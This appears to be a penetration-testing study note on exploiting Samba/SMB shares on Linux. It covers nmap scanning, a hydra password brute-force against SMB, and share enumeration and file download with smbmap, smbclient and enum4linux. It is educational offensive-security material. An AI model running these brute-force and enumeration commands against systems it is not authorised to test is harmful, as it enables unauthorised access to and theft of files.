---
up: "[[Exploiting Linux Vulnerabilities]]"
tools:
  - "[[smbclient]]"
  - "[[SMBMap]]"
---

# Exploiting SAMBA

- SMB is a network file sharing protocol used to facilitate the sharing of files between computers
- SMB uses port 445 or 139 on top of NetBIOS
- SAMBA is the Linux implementation of SMB and allows Windows systems to access Linux shares and devices

- Samba utilizes username + password authentication
	- Vulnerable to brute force
- After obtaining credential we can use SMBMap to enumerate SAMBA share drives
- There is also smbclient

## Demonstration

```bash
nmap -sV $TRG
```

Brute force samba:

```bash
hydra -l admin -P unix_password.txt $TRG SMB
```

Using SMBMap after finding credentials:

```bash
# list shares
smbmap -H $TRG -u admin -p <pass>
```

smbclient:

```bash
# list shares
smbclient -L $TRG -U admin
# 
smbclient //$TRG/<share> -U admin
\> ?
\> dir
\> get <file>
\> exit
```

Using enum4linux:

```bash
enum4linux -a $TRG
enum4linux -a -u admin -p <pass> $TRG
```
